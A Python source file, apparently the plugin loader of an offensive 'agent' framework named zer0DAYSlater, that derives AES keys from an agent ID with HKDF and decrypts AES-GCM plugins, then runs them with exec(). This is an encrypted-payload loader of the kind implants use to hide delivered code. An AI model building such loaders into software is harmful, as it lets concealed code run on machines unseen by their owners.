import base64
import hashlib
import hmac
import json
import os
from Crypto.Cipher import AES


# ── Key derivation ────────────────────────────────────────────────────────────

_HKDF_CONTEXT = b"zer0DAYSlater:plugin-key:v1"


def _hkdf_extract(salt: bytes, ikm: bytes) -> bytes:
    """HKDF-Extract: PRK = HMAC-SHA256(salt, IKM)."""
    return hmac.new(salt, ikm, hashlib.sha256).digest()


def _hkdf_expand(prk: bytes, info: bytes, length: int = 32) -> bytes:
    """HKDF-Expand: produce `length` bytes of keying material."""
    okm = b""
    t   = b""
    for i in range(1, -(-length // 32) + 1):
        t    = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
    return okm[:length]


def derive_key(agent_id: str) -> bytes:
    """
    Derive a 32-byte AES key from agent_id using HKDF-SHA256.

    IKM:  agent_id bytes
    Salt: ZDS_PLUGIN_SALT env var (hex) or fixed fallback.
          Set ZDS_PLUGIN_SALT to a random 32-byte hex value shared
          between encryptor and agent out-of-band for production use.
    Info: fixed context string — domain-separates plugin keys.

    Replaces agent_id[:32].ljust(32, b"0") — trivially predictable
    from the agent ID alone.
    """
    salt_hex = os.environ.get("ZDS_PLUGIN_SALT", "")
    try:
        salt = bytes.fromhex(salt_hex) if salt_hex else hashlib.sha256(b"zds-default-salt").digest()
    except ValueError:
        salt = hashlib.sha256(b"zds-default-salt").digest()
    prk = _hkdf_extract(salt, agent_id.encode("utf-8"))
    return _hkdf_expand(prk, _HKDF_CONTEXT)
def load_encrypted_plugin(encrypted_blob, agent_id):
    try:
        blob = json.loads(encrypted_blob.decode())
        nonce = base64.b64decode(blob["nonce"])
        ciphertext = base64.b64decode(blob["ciphertext"])
        tag = base64.b64decode(blob["tag"])
        key = derive_key(agent_id)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        exec(decrypted, {})
    except Exception as e:
        print(f"[!] Plugin Load Failed: {e}")
